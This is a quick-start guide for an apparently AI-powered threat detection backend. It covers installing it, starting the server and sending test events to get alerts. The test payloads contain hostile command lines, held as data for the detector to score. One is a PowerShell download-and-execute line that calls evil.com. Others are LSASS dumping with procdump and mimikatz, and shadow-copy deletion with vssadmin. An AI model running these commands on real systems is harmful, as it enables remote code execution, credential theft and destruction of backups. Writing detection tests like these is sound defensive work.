# ⚡ Quick Start Guide - Get Running in 5 Minutes

## Prerequisites

- Python 3.8+ installed
- Terminal/Command prompt
- (Optional) Splunk instance for full integration

---

## Step 1: Download & Install (2 minutes)

### Option A: Direct Installation

```bash
# Navigate to the project directory
cd cyb-backend

# Install Python dependencies
pip install -r requirements.txt
```

### Option B: Using Virtual Environment (Recommended)

```bash
cd cyb-backend

# Create isolated Python environment
python -m venv venv

# Activate it
# On Windows:
venv\Scripts\activate
# On Mac/Linux:
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

**You should see**:
```
Successfully installed fastapi, uvicorn, scikit-learn, numpy, requests, ...
```

---

## Step 2: Start the Server (1 minute)

```bash
python main.py
```

**You should see**:
```
[Startup] Initialising XDR engine...
[Startup] Engine ready.
INFO:     Uvicorn running on http://0.0.0.0:8001
```

✅ **Server is now running!**

---

## Step 3: Send Your First Event (1 minute)

In a **new terminal**, send test data:

```bash
curl -X POST http://localhost:8001/ingest \
  -H "X-API-Key: test-key" \
  -H "Content-Type: application/json" \
  -d '{
    "host_id": "DESKTOP-001",
    "user_id": "john.doe",
    "events": [
      {
        "event_type": "process_spawn",
        "command_line": "powershell.exe -enc Z2V0LWNoaWxkaXRlbSAqIC1pbmNsdWRlICouZW5jcnlwdGVk"
      }
    ]
  }'
```

**Response**:
```json
{"status": "queued", "host_id": "DESKTOP-001", "user_id": "john.doe"}
```

✅ **Event submitted!**

---

## Step 4: Check Health

```bash
curl http://localhost:8001/health
```

**Response**:
```json
{
  "status": "ok",
  "queue_depth": 1,
  "baseline_pool": 800,
  "attack_pool": 300,
  "model_ready": true,
  "splunk_online": false,
  "qwen_online": false
}
```

✅ **System is analyzing events!**

---

## Step 5: Get Alerts

```bash
curl http://localhost:8001/alerts \
  -H "X-API-Key: test-key"
```

**Response** (if encoded PowerShell triggered alert):
```json
{
  "count": 1,
  "alerts": [
    {
      "incident_id": "INC-A1B2C3D4",
      "host_id": "DESKTOP-001",
      "user_id": "john.doe",
      "score": 72.5,
      "threat": "HIGH",
      "rules": ["SIG-006"],
      "mitre": ["T1059"],
      "behavior_tags": ["SUSPICIOUS_POWERSHELL"],
      "actions": ["WATCHLIST", "ALERT_ANALYST"]
    }
  ]
}
```

✅ **Alert created!**

---

## Step 6: Understand the Alert

```bash
curl http://localhost:8001/explain-threat/INC-A1B2C3D4 \
  -H "X-API-Key: test-key"
```

**Response**:
```json
{
  "incident_id": "INC-A1B2C3D4",
  "summary": "Threat Score: 72.5/100 (HIGH severity)",
  "why_it_matters": "Suspicious encoded PowerShell script detected.",
  "triggered_rules": ["SIG-006"],
  "behavior_patterns": ["SUSPICIOUS_POWERSHELL"],
  "mitre_tactics": ["T1059"],
  "recommended_actions": ["WATCHLIST", "ALERT_ANALYST"],
  "next_likely_attack_stage": "Defense Evasion"
}
```

✅ **You understand why it was flagged!**

---

## 🧪 Run Full Test Suite

The system includes a built-in test that simulates a real ransomware attack:

```bash
python ml.py
```

This will:
1. Initialize the ML models
2. Simulate a ransomware attack
3. Score the attack
4. Create an alert
5. Print results

**Expected output**:
```
=== QUEUED ALERTS ===
{
  "incident_id": "INC-XXXXX",
  "score": 87.5,
  "threat": "HIGH",
  "behavior_tags": ["RANSOMWARE", "SHADOW_COPY_DELETION"]
}
```

---

## 🔧 Configuration

### Set API Key (Recommended for Production)

```bash
# Windows
set XDR_API_KEY=your-secret-key-here

# Mac/Linux
export XDR_API_KEY=your-secret-key-here
```

Then restart the server. API calls will now require:
```bash
curl ... -H "X-API-Key: your-secret-key-here"
```

### Other Environment Variables

```bash
# Change port
export PORT=9001

# Enable debug mode
export DEV=true

# Splunk connection (see SPLUNK_INTEGRATION.md)
export SPLUNK_HOST=splunk.company.com
export SPLUNK_PORT=8089
export SPLUNK_USERNAME=admin
export SPLUNK_PASSWORD=password
```

---

## 📊 Common Test Scenarios

### Test 1: Suspicious PowerShell

```bash
curl -X POST http://localhost:8001/ingest \
  -H "X-API-Key: test-key" \
  -H "Content-Type: application/json" \
  -d '{
    "host_id": "LAPTOP-01",
    "user_id": "admin",
    "events": [
      {"event_type": "process_spawn", "command_line": "powershell -enc ABC123..."},
      {"event_type": "process_spawn", "command_line": "iex (New-Object Net.WebClient).DownloadString(\"http://evil.com/mal.ps1\")"}
    ]
  }'
```

**Expected**: Score ~70-80, SUSPICIOUS_POWERSHELL tag

### Test 2: LSASS Dumping (Credential Theft)

```bash
curl -X POST http://localhost:8001/ingest \
  -H "X-API-Key: test-key" \
  -H "Content-Type: application/json" \
  -d '{
    "host_id": "LAPTOP-01",
    "user_id": "admin",
    "events": [
      {"event_type": "process_spawn", "command_line": "procdump -ma lsass.exe C:\\temp\\lsass.dmp"},
      {"event_type": "process_spawn", "command_line": "mimikatz.exe"}
    ]
  }'
```

**Expected**: Score ~85+, PRIVILEGE_ESCALATION tag, LSASS dumping rule

### Test 3: Ransomware Pattern

```bash
curl -X POST http://localhost:8001/ingest \
  -H "X-API-Key: test-key" \
  -H "Content-Type: application/json" \
  -d '{
    "host_id": "LAPTOP-01",
    "user_id": "admin",
    "events": [
      {"event_type": "file_write", "path": "C:\\Users\\admin\\Documents\\report.docx.locked"},
      {"event_type": "file_write", "path": "C:\\Users\\admin\\Documents\\budget.xlsx.ryuk"},
      {"event_type": "file_delete", "path": "C:\\backup\\shadow.bak"},
      {"event_type": "process_spawn", "command_line": "vssadmin delete shadows /all"}
    ]
  }'
```

**Expected**: Score ~85+, RANSOMWARE + SHADOW_COPY_DELETION tags

---

## 🐛 Troubleshooting

### "Connection refused" error

```
Error: Connection refused. Is the server running?
```

**Solution**: Make sure you ran `python main.py` in another terminal

### "Port 8001 already in use"

```bash
# Change port
export PORT=8002
python main.py
```

### "sklearn not found" or other import error

```bash
# Reinstall dependencies
pip install --upgrade pip
pip install -r requirements.txt
```

### "models not ready" in response

The ML models take a few seconds to initialize. Wait 2-3 seconds after starting.

---

## ✅ What You Just Did

1. ✅ Installed the AI SOC system
2. ✅ Started the threat detection engine
3. ✅ Sent security events for analysis
4. ✅ Generated a threat alert
5. ✅ Got an explanation of why something was flagged

**You now have a working AI threat detection system!**

---

## 📚 Next Steps

### Learn More
- Read `README.md` for feature overview
- Read `ARCHITECTURE.md` for technical details
- Check `EXAMPLES.md` for real-world attack patterns

### Connect to Splunk (Optional)
- See `SPLUNK_INTEGRATION.md` for step-by-step instructions
- This lets you analyze real security events from your organization

### Deploy to Production
- See `DEPLOYMENT.md` for Docker, cloud, and enterprise setup

### Customize Detection
- See `API_GUIDE.md` for all endpoints
- Add custom rules by modifying `RULES` in `ml.py`
- Adjust sensitivity via `Engine.THRESHOLD`

---

## 🎯 Typical Workflow

```
1. Events flow in from your systems
   ↓
2. System analyzes them in real-time
   ↓
3. If threat score > 65, create alert
   ↓
4. Alert appears in your dashboard
   ↓
5. Analyst reviews and takes action
   ↓
6. Feedback improves future detections
```

---

**Questions? Check the documentation files in the cyb-backend folder!**

🚀 **Happy threat hunting!**
